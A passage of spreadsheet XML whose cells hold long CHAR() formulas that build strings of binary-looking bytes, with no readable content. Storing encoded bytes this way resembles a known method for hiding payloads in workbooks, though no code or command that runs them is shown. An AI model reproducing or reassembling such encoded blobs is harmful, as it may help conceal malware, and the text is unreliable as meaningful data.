)&amp;CHAR(189)&amp;CHAR(196)&amp;CHAR(13)&amp;CHAR(54)&amp;CHAR(111)&amp;CHAR(191)&amp;CHAR(204)&amp;CHAR(212)&amp;CHAR(99)&amp;CHAR(65)&amp;CHAR(128)&amp;CHAR(21)&amp;CHAR(26)&amp;CHAR(192)&amp;CHAR(36)&amp;CHAR(154)&amp;CHAR(97)&amp;CHAR(40)&amp;CHAR(254)&amp;CHAR(45)&amp;CHAR(249)&amp;CHAR(226)&amp;CHAR(148)&amp;CHAR(204)&amp;CHAR(139)&amp;CHAR(213)&amp;CHAR(209)&amp;CHAR(207)&amp;CHAR(5)&amp;CHAR(123)&amp;CHAR(54)&amp;CHAR(213)&amp;CHAR(245)&amp;CHAR(124)&amp;CHAR(209)&amp;CHAR(196)&amp;CHAR(101)&amp;CHAR(175)&amp;CHAR(12)&amp;CHAR(191)&amp;CHAR(61)&amp;CHAR(168)&amp;CHAR(248)&amp;CHAR(39)&amp;CHAR(175)&amp;CHAR(133)&amp;CHAR(9)&amp;CHAR(60)&amp;CHAR(81)&amp;CHAR(179)&amp;CHAR(229)&amp;CHAR(18)&amp;CHAR(163)&amp;CHAR(233)&amp;CHAR(181)&amp;CHAR(74)&amp;CHAR(222)&amp;CHAR(62)&amp;CHAR(64)&amp;CHAR(119)&amp;CHAR(162)&amp;CHAR(214)&amp;CHAR(254)&amp;CHAR(107)&amp;CHAR(169)&amp;CHAR(172)&amp;CHAR(231)&amp;CHAR(193)&amp;CHAR(17)&amp;CHAR(253)&amp;CHAR(229)&amp;CHAR(67)&amp;CHAR(59)&amp;CHAR(169)&amp;CHAR(40)&amp;CHAR(101)&amp;CHAR(51)&amp;CHAR(183)&amp;CHAR(60)&amp;CHAR(166)&amp;CHAR(72)&amp;CHAR(195)&amp;CHAR(220)&amp;CHAR(78)&amp;CHAR(116)&amp;CHAR(151)&amp;CHAR(117)&amp;CHAR(48)&amp;CHAR(195)&amp;CHAR(111)&amp;CHAR(173)&amp;CHAR(214)&amp;CHAR(237)&amp;CHAR(209)&amp;CHAR(171)&amp;CHAR(119)&amp;CHAR(85)&amp;CHAR(224)&amp;CHAR(167)&amp;CHAR(133)&amp;CHAR(190)&amp;CHAR(255)&amp;CHAR(37)&amp;CHAR(106)&amp;CHAR(172)&amp;CHAR(61)&amp;CHAR(76)&amp;CHAR(109)&amp;CHAR(249)&amp;CHAR(86)&amp;CHAR(9)&amp;CHAR(114)&amp;CHAR(95)&amp;CHAR(59)&amp;CHAR(3)&amp;CHAR(246)&amp;CHAR(214)&amp;CHAR(103)&amp;CHAR(88)&amp;CHAR(111)&amp;CHAR(132)&amp;CHAR(54)&amp;CHAR(126)&amp;CHAR(57)&amp;CHAR(11)&amp;CHAR(49)&amp;CHAR(59)&amp;CHAR(239)&amp;CHAR(233)&amp;CHAR(241)&amp;CHAR(49)&amp;CHAR(97)&amp;CHAR(113)&amp;CHAR(36)&amp;CHAR(58)&amp;CHAR(127)&amp;CHAR(246)&amp;CHAR(134)&amp;CHAR(222)&amp;CHAR(8)&amp;CHAR(196)&amp;CHAR(222)&amp;CHAR(108)&amp;CHAR(248)&amp;CHAR(116)&amp;CHAR(22)&amp;CHAR(212)&amp;CHAR(211)&amp;CHAR(139)&amp;CHAR(70)&amp;CHAR(88)&amp;CHAR(29)&amp;CHAR(9)&amp;CHAR(210)&amp;CHAR(252)&amp;CHAR(78)&amp;CHAR(95)&amp;CHAR(41)&amp;CHAR(143)&amp;CHAR(48)&amp;CHAR(214)&amp;CHAR(124)&amp;CHAR(196)&amp;CHAR(76)&amp;CHAR(126)&amp;CHAR(44)</f>
        <v>Áû'ÿ_x0015_€lu)"HŽ¶²×bø•. „7fBñÑÒÒV“&lt;çduŸ_x000E_ j_x0006_b‚î?®2ÍéÀð_x0013_ªž†_x0019_*Dû«_x000F_aq_x0005_
”_x0001_®È¢´#ÉÄ=Öº"$¥ª&amp;Bµã÷¹Q½Ä_x000D_6o¿ÌÔcA€_x0015__x001A_À$ša(þ-ùâ”Ì‹ÕÑÏ_x0005_{6Õõ|ÑÄe¯_x000C_¿=¨ø'¯…	&lt;Q³å_x0012_£éµJÞ&gt;@w¢Öþk©¬çÁ_x0011_ýåC;©(e3·&lt;¦HÃÜNt—u0Ão­ÖíÑ«wUà§…¾ÿ%j¬=LmùV	r_;_x0003_öÖgXo„6~9_x000B_1;ïéñ1aq$:ö†Þ_x0008_ÄÞløt_x0016_ÔÓ‹FX_x001D_	ÒüN_)0Ö|ÄL~,</v>
      </c>
      <c r="C51" t="str">
        <f>CHAR(248)&amp;CHAR(19)&amp;CHAR(229)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(191)&amp;CHAR(126)&amp;CHAR(53)&amp;CHAR(102)</f>
        <v>ø_x0013_åë»ë¿~5f</v>
      </c>
    </row>
    <row r="52" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B52" t="str">
        <f>CHAR(18)&amp;CHAR(129)&amp;CHAR(155)&amp;CHAR(130)&amp;CHAR(152)&amp;CHAR(24)&amp;CHAR(151)&amp;CHAR(4)&amp;CHAR(55)&amp;CHAR(41)&amp;CHAR(7)&amp;CHAR(45)&amp;CHAR(196)&amp;CHAR(228)&amp;CHAR(176)&amp;CHAR(104)&amp;CHAR(42)&amp;CHAR(248)&amp;CHAR(7)&amp;CHAR(226)&amp;CHAR(130)&amp;CHAR(118)&amp;CHAR(188)&amp;CHAR(93)&amp;CHAR(72)&amp;CHAR(98)&amp;CHAR(38)&amp;CHAR(163)&amp;CHAR(103)&amp;CHAR(60)&amp;CHAR(218)&amp;CHAR(203)&amp;CHAR(192)&amp;CHAR(130)&amp;CHAR(64)&amp;CHAR(119)&amp;CHAR(186)&amp;CHAR(213)&amp;CHAR(132)&amp;CHAR(173)&amp;CHAR(63)&amp;CHAR(201)&amp;CHAR(226)&amp;CHAR(54)&amp;CHAR(119)&amp;CHAR(80)&amp;CHAR(27)&amp;CHAR(150)&amp;CHAR(228)&amp;CHAR(54)&amp;CHAR(220)&amp;CHAR(100)&amp;CHAR(183)&amp;CHAR(212)&amp;CHAR(85)&amp;CHAR(134)&amp;CHAR(2)&amp;CHAR(101)&amp;CHAR(240)&amp;CHAR(151)&amp;CHAR(254)&amp;CHAR(80)&amp;CHAR(248)&amp;CHAR(95)&amp;CHAR(122)&amp;CHAR(92)&amp;CHAR(154)&amp;CHAR(74)&amp;CHAR(192)&amp;CHAR(8)&amp;CHAR(109)&amp;CHAR(118)&amp;CHAR(87)&amp;CHAR(94)&amp;CHAR(144)&amp;CHAR(106)&amp;CHAR(211)&amp;CHAR(111)&amp;CHAR(238)&amp;CHAR(56)&amp;CHAR(25)&amp;CHAR(180)&amp;CHAR(173)&amp;CHAR(220)&amp;CHAR(145)&amp;CHAR(217)&amp;CHAR(70)&amp;CHAR(131)&amp;CHAR(10)&amp;CHAR(231)&amp;CHAR(101)&amp;CHAR(65)&amp;CHAR(90)&amp;CHAR(225)&amp;CHAR(127)&amp;CHAR(255)&amp;CHAR(159)&amp;CHAR(224)&amp;CHAR(9)&amp;CHAR(121)&amp;CHAR(224)&amp;CHAR(24)&amp;CHAR(82)&amp;CHAR(149)&amp;CHAR(33)&amp;CHAR(240)&amp;CHAR(38)&amp;CHAR(199)&amp;CHAR(39)&amp;CHAR(75)&amp;CHAR(58)&amp;CHAR(49)&amp;CHAR(162)&amp;CHAR(12)&amp;CHAR(132)&amp;CHAR(168)&amp;CHAR(117)&amp;CHAR(23)&amp;CHAR(240)&amp;CHAR(33)&amp;CHAR(58)&amp;CHAR(218)&amp;CHAR(239)&amp;CHAR(159)&amp;CHAR(76)&amp;CHAR(160)&amp;CHAR(118)&amp;CHAR(231)&amp;CHAR(94)&amp;CHAR(157)&amp;CHAR(38)&amp;CHAR(168)&amp;CHAR(133)&amp;CHAR(232)&amp;CHAR(74)&amp;CHAR(47)&amp;CHAR(78)&amp;CHAR(244)&amp;CHAR(39)&amp;CHAR(165)&amp;CHAR(222)&amp;CHAR(166)&amp;CHAR(164)&amp;CHAR(180)&amp;CHAR(198)&amp;CHAR(187)&amp;CHAR(180)&amp;CHAR(236)&amp;CHAR(83)&amp;CHAR(36)&amp;CHAR(38)&amp;CHAR(53)&amp;CHAR(175)&amp;CHAR(9)&amp;CHAR(126)&amp;CHAR(178)&amp;CHAR(210)&amp;CHAR(51)&amp;CHAR(152)&amp;CHAR(121)&amp;CHAR(95)&amp;CHAR(65)&amp;CHAR(239)&amp;CHAR(76)&amp;CHAR(109)&amp;CHAR(108)&amp;CHAR(95)&amp;CHAR(12)&amp;CHAR(110)&amp;CHAR(211)&amp;CHAR(194)&amp;CHAR(227)&amp;CHAR(97)&amp;CHAR(236)&amp;CHAR(173)&amp;CHAR(228)&amp;CHAR(84)&amp;CHAR(31)&amp;CHAR(236)&amp;CHAR(178)&amp;CHAR(19)&amp;CHAR(10)&amp;CHAR(121)&amp;CHAR(175)&amp;CHAR(92)&amp;CHAR(90)&amp;CHAR(190)&amp;CHAR(75)&amp;CHAR(235)&amp;CHAR(78)&amp;CHAR(5)&amp;CHAR(24)&amp;CHAR(59)&amp;CHAR(31)&amp;CHAR(208)&amp;CHAR(66)&amp;CHAR(175)&amp;CHAR(240)&amp;CHAR(164)&amp;CHAR(41)&amp;CHAR(62)&amp;CHAR(38)&amp;CHAR(16)&amp;CHAR(248)&amp;CHAR(73)&amp;CHAR(184)&amp;CHAR(5)&amp;CHAR(117)&amp;CHAR(202)&amp;CHAR(140)&amp;CHAR(31)&amp;CHAR(105)&amp;CHAR(89)&amp;CHAR(110)&amp;CHAR(90)&amp;CHAR(168)&amp;CHAR(87)&amp;CHAR(188)&amp;CHAR(85)&amp;CHAR(4)&amp;CHAR(200)&amp;CHAR(157)&amp;CHAR(148)&amp;CHAR(165)&amp;CHAR(38)&amp;CHAR(30)&amp;CHAR(69)&amp;CHAR(87)&amp;CHAR(44)&amp;CHAR(196)&amp;CHAR(137)&amp;CHAR(233)&amp;CHAR(144)&amp;CHAR(40)&amp;CHAR(221)&amp;CHAR(46)&amp;CHAR(75)&amp;CHAR(220)&amp;CHAR(247)&amp;CHAR(61)&amp;CHAR(29)&amp;CHAR(6)&amp;CHAR(97)&amp;CHAR(116)&amp;CHAR(13)&amp;CHAR(103)&amp;CHAR(162)&amp;CHAR(79)&amp;CHAR(80)&amp;CHAR(75)&amp;CHAR(184)&amp;CHAR(119)&amp;CHAR(26)&amp;CHAR(71)&amp;CHAR(35)</f>
        <v>_x0012_›‚˜_x0018_—_x0004_7)_x0007_-Ää°h*ø_x0007_â‚v¼]Hb&amp;£g&lt;ÚËÀ‚@wºÕ„­?Éâ6wP_x001B_–ä6Üd·ÔU†_x0002_eð—þPø_z\šJÀ_x0008_mvW^jÓoî8_x0019_´­Ü‘ÙFƒ
çeAZáÿŸà	yà_x0018_R•!ð&amp;Ç'K:1¢_x000C_„¨u_x0017_ð!:ÚïŸL vç^&amp;¨…èJ/Nô'¥Þ¦¤´Æ»´ìS$&amp;5¯	~²Ò3˜y_AïLml__x000C_nÓÂãaì­äT_x001F_ì²_x0013_
y¯\Z¾KëN_x0005__x0018_;_x001F_ÐB¯ð¤)&gt;&amp;_x0010_øI¸_x0005_uÊŒ_x001F_iYnZ¨W¼U_x0004_È”¥&amp;_x001E_EW,Ä‰é(Ý.KÜ÷=_x001D__x0006_at_x000D_g¢OPK¸w_x001A_G#</v>
      </c>
      <c r="C52" t="str">
        <f>CHAR(133)&amp;CHAR(96)&amp;CHAR(178)&amp;CHAR(20)&amp;CHAR(167)&amp;CHAR(229)&amp;CHAR(113)&amp;CHAR(246)&amp;CHAR(194)&amp;CHAR(110)</f>
        <v>…`²_x0014_§åqöÂn</v>
      </c>
    </row>
    <row r="53" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B53" t="str">
        <f>CHAR(13)&amp;CHAR(189)&amp;CHAR(60)&amp;CHAR(146)&amp;CHAR(168)&amp;CHAR(64)&amp;CHAR(150)&amp;CHAR(58)&amp;CHAR(136)&amp;CHAR(119)&amp;CHAR(116)&amp;CHAR(97)&amp;CHAR(3)&amp;CHAR(183)&amp;CHAR(68)&amp;CHAR(82)&amp;CHAR(53)&amp;CHAR(239)&amp;CHAR(221)&amp;CHAR(4)&amp;CHAR(18)&amp;CHAR(140)&amp;CHAR(197)&amp;CHAR(224)&amp;CHAR(118)&amp;CHAR(169)&amp;CHAR(67)&amp;CHAR(188)&amp;CHAR(254)&amp;CHAR(60)&amp;CHAR(128)&amp;CHAR(15)&amp;CHAR(180)&amp;CHAR(60)&amp;CHAR(242)&amp;CHAR(211)&amp;CHAR(149)&amp;CHAR(44)&amp;CHAR(170)&amp;CHAR(88)&amp;CHAR(191)&amp;CHAR(244)&amp;CHAR(176)&amp;CHAR(138)&amp;CHAR(214)&amp;CHAR(71)&amp;CHAR(46)&amp;CHAR(202)&amp;CHAR(96)&amp;CHAR(174)&amp;CHAR(186)&amp;CHAR(20)&amp;CHAR(197)&amp;CHAR(174)&amp;CHAR(243)&amp;CHAR(247)&amp;CHAR(50)&amp;CHAR(221)&amp;CHAR(149)&amp;CHAR(81)&amp;CHAR(1)&amp;CHAR(129)&amp;CHAR(82)&amp;CHAR(43)&amp;CHAR(157)&amp;CHAR(112)&amp;CHAR(237)&amp;CHAR(248)&amp;CHAR(84)&amp;CHAR(111)&amp;CHAR(64)&amp;CHAR(62)&amp;CHAR(129)&amp;CHAR(160)&amp;CHAR(223)&amp;CHAR(134)&amp;CHAR(14)&amp;CHAR(198)&amp;CHAR(117)&amp;CHAR(150)&amp;CHAR(20)&amp;CHAR(248)&amp;CHAR(171)&amp;CHAR(45)&amp;CHAR(89)&amp;CHAR(19)&amp;CHAR(149)&amp;CHAR(50)&amp;CHAR(11)&amp;CHAR(9)&amp;CHAR(160)&amp;CHAR(227)&amp;CHAR(204)&amp;CHAR(126)&amp;CHAR(126)&amp;CHAR(56)&amp;CHAR(154)&amp;CHAR(41)&amp;CHAR(193)&amp;CHAR(251)&amp;CHAR(203)&amp;CHAR(108)&amp;CHAR(206)&amp;CHAR(24)&amp;CHAR(130)&amp;CHAR(57)&amp;CHAR(5)&amp;CHAR(31)&amp;CHAR(126)&amp;CHAR(222)&amp;CHAR(35)&amp;CHAR(27)&amp;CHAR(180)&amp;CHAR(33)&amp;CHAR(13)&amp;CHAR(17)&amp;CHAR(236)&amp;CHAR(124)&amp;CHAR(144)&amp;CHAR(117)&amp;CHAR(126)&amp;CHAR(4)&amp;CHAR(144)&amp;CHAR(135)&amp;CHAR(244)&amp;CHAR(186)&amp;CHAR(88)&amp;CHAR(84)&amp;CHAR(40)&amp;CHAR(184)&amp;CHAR(63)&amp;CHAR(97)&amp;CHAR(186)&amp;CHAR(103)&amp;CHAR(45)&amp;CHAR(154)&amp;CHAR(212)&amp;CHAR(90)&amp;CHAR(37)&amp;CHAR(61)&amp;CHAR(87)&amp;CHAR(60)&amp;CHAR(125)&amp;CHAR(1)&amp;CHAR(172)&amp;CHAR(11)&amp;CHAR(106)&amp;CHAR(220)&amp;CHAR(33)&amp;CHAR(224)&amp;CHAR(212)&amp;CHAR(229)&amp;CHAR(145)&amp;CHAR(42)&amp;CHAR(33)&amp;CHAR(210)&amp;CHAR(38)&amp;CHAR(13)&amp;CHAR(210)&amp;CHAR(1)&amp;CHAR(215)&amp;CHAR(225)&amp;CHAR(39)&amp;CHAR(72)&amp;CHAR(188)&amp;CHAR(103)&amp;CHAR(29)&amp;CHAR(39)&amp;CHAR(229)&amp;CHAR(154)&amp;CHAR(66)&amp;CHAR(243)&amp;CHAR(106)&amp;CHAR(62)&amp;CHAR(22)&amp;CHAR(49)&amp;CHAR(80)&amp;CHAR(122)&amp;CHAR(204)&amp;CHAR(182)&amp;CHAR(26)&amp;CHAR(181)&amp;CHAR(116)&amp;CHAR(219)&amp;CHAR(80)&amp;CHAR(98)&amp;CHAR(155)&amp;CHAR(209)&amp;CHAR(156)&amp;CHAR(254)&amp;CHAR(88)&amp;CHAR(69)&amp;CHAR(6)&amp;CHAR(144)&amp;CHAR(217)&amp;CHAR(148)&amp;CHAR(197)&amp;CHAR(171)&amp;CHAR(173)&amp;CHAR(55)&amp;CHAR(136)&amp;CHAR(231)&amp;CHAR(72)&amp;CHAR(179)&amp;CHAR(25)&amp;CHAR(171)&amp;CHAR(98)&amp;CHAR(213)&amp;CHAR(230)&amp;CHAR(8)&amp;CHAR(180)&amp;CHAR(81)&amp;CHAR(73)&amp;CHAR(97)&amp;CHAR(218)&amp;CHAR(45)&amp;CHAR(233)&amp;CHAR(98)&amp;CHAR(103)&amp;CHAR(87)&amp;CHAR(62)&amp;CHAR(230)&amp;CHAR(40)&amp;CHAR(151)&amp;CHAR(133)&amp;CHAR(162)&amp;CHAR(183)&amp;CHAR(75)&amp;CHAR(221)&amp;CHAR(9)&amp;CHAR(214)&amp;CHAR(229)&amp;CHAR(86)&amp;CHAR(27)&amp;CHAR(103)&amp;CHAR(166)&amp;CHAR(91)&amp;CHAR(4)&amp;CHAR(96)&amp;CHAR(18)&amp;CHAR(153)&amp;CHAR(162)&amp;CHAR(6)&amp;CHAR(29)&amp;CHAR(197)&amp;CHAR(161)&amp;CHAR(199)&amp;CHAR(167)&amp;CHAR(190)&amp;CHAR(176)&amp;CHAR(171)&amp;CHAR(97)&amp;CHAR(214)&amp;CHAR(135)&amp;CHAR(43)</f>
        <v>_x000D_½&lt;’¨@–:ˆwta_x0003_·DR5ïÝ_x0004__x0012_ŒÅàv©C¼þ&lt;€_x000F_´&lt;òÓ•,ªX¿ô°ŠÖG.Ê`®º_x0014_Å®ó÷2Ý•Q_x0001_R+píøTo@&gt; ß†_x000E_Æu–_x0014_ø«-Y_x0013_•2_x000B_	 ãÌ~~8š)ÁûËlÎ_x0018_‚9_x0005__x001F_~Þ#_x001B_´!_x000D__x0011_ì|u~_x0004_‡ôºXT(¸?aºg-šÔZ%=W&lt;}_x0001_¬_x000B_jÜ!àÔå‘*!Ò&amp;_x000D_Ò_x0001_×á'H¼g_x001D_'åšBój&gt;_x0016_1PzÌ¶_x001A_µtÛPb›ÑœþXE_x0006_Ù”Å«­7ˆçH³_x0019_«bÕæ_x0008_´QIaÚ-ébgW&gt;æ(—…¢·KÝ	ÖåV_x001B_g¦[_x0004_`_x0012_™¢_x0006__x001D_Å¡Ç§¾°«aÖ‡+</v>
      </c>
      <c r="C53" t="str">
        <f>CHAR(142)&amp;CHAR(232)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(145)&amp;CHAR(126)&amp;CHAR(70)&amp;CHAR(239)&amp;CHAR(158)&amp;CHAR(195)</f>
        <v>Žè÷ý‘~FïžÃ</v>
      </c>
    </row>
    <row r="54" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B54" t="str">
        <f>CHAR(112)&amp;CHAR(216)&amp;CHAR(250)&amp;CHAR(61)&amp;CHAR(30)&amp;CHAR(66)&amp;CHAR(33)&amp;CHAR(238)&amp;CHAR(8)&amp;CHAR(153)&amp;CHAR(145)&amp;CHAR(236)&amp;CHAR(189)&amp;CHAR(14)&amp;CHAR(170)&amp;CHAR(1)&amp;CHAR(20)&amp;CHAR(48)&amp;CHAR(4)&amp;CHAR(199)&amp;CHAR(175)&amp;CHAR(217)&amp;CHAR(194)&amp;CHAR(207)&amp;CHAR(70)&amp;CHAR(132)&amp;CHAR(118)&amp;CHAR(182)&amp;CHAR(17)&amp;CHAR(106)&amp;CHAR(119)&amp;CHAR(109)&amp;CHAR(235)&amp;CHAR(239)&amp;CHAR(174)&amp;CHAR(5)&amp;CHAR(116)&amp;CHAR(125)&amp;CHAR(160)&amp;CHAR(22)&amp;CHAR(39)&amp;CHAR(63)&amp;CHAR(90)&amp;CHAR(85)&amp;CHAR(63)&amp;CHAR(226)&amp;CHAR(134)&amp;CHAR(83)&amp;CHAR(81)&amp;CHAR(74)&amp;CHAR(39)&amp;CHAR(38)&amp;CHAR(69)&amp;CHAR(55)&amp;CHAR(20)&amp;CHAR(3)&amp;CHAR(35)&amp;CHAR(157)&amp;CHAR(212)&amp;CHAR(136)&amp;CHAR(20)&amp;CHAR(15)&amp;CHAR(3)&amp;CHAR(236)&amp;CHAR(4)&amp;CHAR(181)&amp;CHAR(79)&amp;CHAR(103)&amp;CHAR(149)&amp;CHAR(169)&amp;CHAR(51)&amp;CHAR(194)&amp;CHAR(9)&amp;CHAR(158)&amp;CHAR(42)&amp;CHAR(36)&amp;CHAR(39)&amp;CHAR(147)&amp;CHAR(161)&amp;CHAR(96)&amp;CHAR(113)&amp;CHAR(147)&amp;CHAR(66)&amp;CHAR(39)&amp;CHAR(45)&amp;CHAR(240)&amp;CHAR(3)&amp;CHAR(38)&amp;CHAR(145)&amp;CHAR(32)&amp;CHAR(198)&amp;CHAR(221)&amp;CHAR(253)&amp;CHAR(70)&amp;CHAR(16)&amp;CHAR(97)&amp;CHAR(38)&amp;CHAR(228)&amp;CHAR(249)&amp;CHAR(90)&amp;CHAR(114)&amp;CHAR(193)&amp;CHAR(251)&amp;CHAR(57)&amp;CHAR(38)&amp;CHAR(185)&amp;CHAR(204)&amp;CHAR(150)&amp;CHAR(68)&amp;CHAR(65)&amp;CHAR(227)&amp;CHAR(12)&amp;CHAR(49)&amp;CHAR(254)&amp;CHAR(209)&amp;CHAR(42)&amp;CHAR(112)&amp;CHAR(62)&amp;CHAR(101)&amp;CHAR(106)&amp;CHAR(160)&amp;CHAR(30)&amp;CHAR(18)&amp;CHAR(195)&amp;CHAR(225)&amp;CHAR(139)&amp;CHAR(58)&amp;CHAR(138)&amp;CHAR(168)&amp;CHAR(140)&amp;CHAR(53)&amp;CHAR(73)&amp;CHAR(158)&amp;CHAR(42)&amp;CHAR(216)&amp;CHAR(72)&amp;CHAR(156)&amp;CHAR(40)&amp;CHAR(57)&amp;CHAR(9)&amp;CHAR(63)&amp;CHAR(151)&amp;CHAR(152)&amp;CHAR(30)&amp;CHAR(86)&amp;CHAR(75)&amp;CHAR(185)&amp;CHAR(200)&amp;CHAR(143)&amp;CHAR(212)&amp;CHAR(164)&amp;CHAR(176)&amp;CHAR(48)&amp;CHAR(160)&amp;CHAR(103)&amp;CHAR(142)&amp;CHAR(156)&amp;CHAR(110)&amp;CHAR(231)&amp;CHAR(195)&amp;CHAR(183)&amp;CHAR(235)&amp;CHAR(69)&amp;CHAR(183)&amp;CHAR(66)&amp;CHAR(88)&amp;CHAR(251)&amp;CHAR(170)&amp;CHAR(122)&amp;CHAR(54)&amp;CHAR(99)&amp;CHAR(168)&amp;CHAR(17)&amp;CHAR(26)&amp;CHAR(34)&amp;CHAR(56)&amp;CHAR(179)&amp;CHAR(96)&amp;CHAR(246)&amp;CHAR(161)&amp;CHAR(156)&amp;CHAR(182)&amp;CHAR(249)&amp;CHAR(16)&amp;CHAR(158)&amp;CHAR(200)&amp;CHAR(77)&amp;CHAR(201)&amp;CHAR(136)&amp;CHAR(146)&amp;CHAR(30)&amp;CHAR(127)&amp;CHAR(130)&amp;CHAR(109)&amp;CHAR(251)&amp;CHAR(88)&amp;CHAR(254)&amp;CHAR(168)&amp;CHAR(228)&amp;CHAR(64)&amp;CHAR(166)&amp;CHAR(138)&amp;CHAR(223)&amp;CHAR(157)&amp;CHAR(134)&amp;CHAR(112)&amp;CHAR(93)&amp;CHAR(111)&amp;CHAR(188)&amp;CHAR(37)&amp;CHAR(199)&amp;CHAR(231)&amp;CHAR(33)&amp;CHAR(64)&amp;CHAR(106)&amp;CHAR(48)&amp;CHAR(166)&amp;CHAR(68)&amp;CHAR(198)&amp;CHAR(216)&amp;CHAR(17)&amp;CHAR(134)&amp;CHAR(94)&amp;CHAR(132)&amp;CHAR(1)&amp;CHAR(254)&amp;CHAR(6)&amp;CHAR(175)&amp;CHAR(151)&amp;CHAR(82)&amp;CHAR(151)&amp;CHAR(31)&amp;CHAR(29)&amp;CHAR(97)&amp;CHAR(118)&amp;CHAR(159)&amp;CHAR(65)&amp;CHAR(161)&amp;CHAR(224)&amp;CHAR(152)&amp;CHAR(136)&amp;CHAR(141)&amp;CHAR(221)&amp;CHAR(174)&amp;CHAR(236)&amp;CHAR(142)&amp;CHAR(151)&amp;CHAR(3)&amp;CHAR(164)&amp;CHAR(9)&amp;CHAR(159)&amp;CHAR(182)&amp;CHAR(6)&amp;CHAR(57)&amp;CHAR(53)</f>
        <v>pØú=_x001E_B!î_x0008_™‘ì½_x000E_ª_x0001__x0014_0_x0004_Ç¯ÙÂÏF„v¶_x0011_jwmëï®_x0005_t} _x0016_'?ZU?â†SQJ'&amp;E7_x0014__x0003_#Ôˆ_x0014__x000F__x0003_ì_x0004_µOg•©3Â	ž*$'“¡`q“B'-ð_x0003_&amp;‘ ÆÝýF_x0010_a&amp;äùZrÁû9&amp;¹Ì–DAã_x000C_1þÑ*p&gt;ej _x001E__x0012_Ãá‹:Š¨Œ5Iž*ØHœ(9	?—˜_x001E_VK¹ÈÔ¤°0 gŽœnçÃ·ëE·BXûªz6c¨_x0011__x001A_"8³`ö¡œ¶ù_x0010_žÈMÉˆ’_x001E_‚mûXþ¨ä@¦Šß†p]o¼%Çç!@j0¦DÆØ_x0011_†^„_x0001_þ_x0006_¯—R—_x001F__x001D_avŸA¡à˜ˆÝ®ìŽ—_x0003_¤	Ÿ¶_x0006_95</v>
      </c>
      <c r="C54" t="str">
        <f>CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(126)&amp;CHAR(78)&amp;CHAR(43)&amp;CHAR(227)&amp;CHAR(163)&amp;CHAR(124)&amp;CHAR(253)</f>
        <v>÷ýô~N+ã£|ý</v>
      </c>
    </row>
    <row r="55" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B55" t="str">
        <f>CHAR(63)&amp;CHAR(151)&amp;CHAR(140)&amp;CHAR(137)&amp;CHAR(139)&amp;CHAR(236)&amp;CHAR(198)&amp;CHAR(81)&amp;CHAR(86)&amp;CHAR(124)&amp;CHAR(60)&amp;CHAR(206)&amp;CHAR(145)&amp;CHAR(165)&amp;CHAR(64)&amp;CHAR(14)&amp;CHAR(86)&amp;CHAR(186)&amp;CHAR(173)&amp;CHAR(233)&amp;CHAR(41)&amp;CHAR(160)&amp;CHAR(213)&amp;CHAR(86)&amp;CHAR(44)&amp;CHAR(214)&amp;CHAR(45)&amp;CHAR(70)&amp;CHAR(148)&amp;CHAR(99)&amp;CHAR(179)&amp;CHAR(237)&amp;CHAR(209)&amp;CHAR(73)&amp;CHAR(249)&amp;CHAR(84)&amp;CHAR(74)&amp;CHAR(83)&amp;CHAR(242)&amp;CHAR(31)&amp;CHAR(22)&amp;CHAR(98)&amp;CHAR(44)&amp;CHAR(221)&amp;CHAR(187)&amp;CHAR(121)&amp;CHAR(36)&amp;CHAR(1)&amp;CHAR(236)&amp;CHAR(188)&amp;CHAR(117)&amp;CHAR(47)&amp;CHAR(153)&amp;CHAR(108)&amp;CHAR(65)&amp;CHAR(151)&amp;CHAR(221)&amp;CHAR(128)&amp;CHAR(151)&amp;CHAR(186)&amp;CHAR(212)&amp;CHAR(179)&amp;CHAR(240)&amp;CHAR(23)&amp;CHAR(135)&amp;CHAR(7)&amp;CHAR(4)&amp;CHAR(207)&amp;CHAR(131)&amp;CHAR(185)&amp;CHAR(29)&amp;CHAR(88)&amp;CHAR(162)&amp;CHAR(69)&amp;CHAR(24)&amp;CHAR(26)&amp;CHAR(145)&amp;CHAR(46)&amp;CHAR(72)&amp;CHAR(35)&amp;CHAR(136)&amp;CHAR(180)&amp;CHAR(7)&amp;CHAR(147)&amp;CHAR(226)&amp;CHAR(116)&amp;CHAR(200)&amp;CHAR(126)&amp;CHAR(172)&amp;CHAR(17)&amp;CHAR(244)&amp;CHAR(194)&amp;CHAR(151)&amp;CHAR(158)&amp;CHAR(162)&amp;CHAR(124)&amp;CHAR(195)&amp;CHAR(41)&amp;CHAR(186)&amp;CHAR(199)&amp;CHAR(193)&amp;CHAR(109)&amp;CHAR(92)&amp;CHAR(53)&amp;CHAR(239)&amp;CHAR(223)&amp;CHAR(207)&amp;CHAR(231)&amp;CHAR(171)&amp;CHAR(235)&amp;CHAR(176)&amp;CHAR(20)&amp;CHAR(244)&amp;CHAR(152)&amp;CHAR(250)&amp;CHAR(227)&amp;CHAR(155)&amp;CHAR(15)&amp;CHAR(145)&amp;CHAR(49)&amp;CHAR(221)&amp;CHAR(156)&amp;CHAR(53)&amp;CHAR(163)&amp;CHAR(163)&amp;CHAR(174)&amp;CHAR(66)&amp;CHAR(158)&amp;CHAR(66)&amp;CHAR(91)&amp;CHAR(15)&amp;CHAR(116)&amp;CHAR(148)&amp;CHAR(165)&amp;CHAR(212)&amp;CHAR(30)&amp;CHAR(251)&amp;CHAR(84)&amp;CHAR(27)&amp;CHAR(92)&amp;CHAR(146)&amp;CHAR(190)&amp;CHAR(33)&amp;CHAR(133)&amp;CHAR(75)&amp;CHAR(139)&amp;CHAR(108)&amp;CHAR(184)&amp;CHAR(207)&amp;CHAR(224)&amp;CHAR(48)&amp;CHAR(89)&amp;CHAR(5)&amp;CHAR(215)&amp;CHAR(48)&amp;CHAR(100)&amp;CHAR(241)&amp;CHAR(94)&amp;CHAR(103)&amp;CHAR(191)&amp;CHAR(19)&amp;CHAR(253)&amp;CHAR(150)&amp;CHAR(124)&amp;CHAR(167)&amp;CHAR(60)&amp;CHAR(195)&amp;CHAR(2)&amp;CHAR(206)&amp;CHAR(172)&amp;CHAR(35)&amp;CHAR(158)&amp;CHAR(47)&amp;CHAR(210)&amp;CHAR(71)&amp;CHAR(9)&amp;CHAR(14)&amp;CHAR(149)&amp;CHAR(166)&amp;CHAR(89)&amp;CHAR(32)&amp;CHAR(114)&amp;CHAR(22)&amp;